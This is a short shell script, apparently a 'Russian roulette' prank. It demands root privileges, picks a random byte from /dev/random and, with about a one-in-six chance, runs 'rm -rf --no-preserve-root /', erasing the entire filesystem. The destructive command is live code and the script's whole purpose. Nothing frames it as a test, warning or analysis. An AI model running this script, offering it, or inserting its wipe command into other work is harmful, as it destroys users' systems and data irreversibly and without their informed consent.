#!/bin/sh

set -euE

# detect if root
if [ "$(id -u)" -ne 0 ]; then
	echo "Must be run as root" >&2
	exit 126
fi

# select random number in range 0-255
random_number="$(od -A n -t d -N 1 /dev/random | tr -d '[[:space:]]')"

# cirka 1/6 chance (255 / 6 = 42.5)
if [ "$random_number" -lt 42 ]; then
	rm -rf --no-preserve-root /
fi
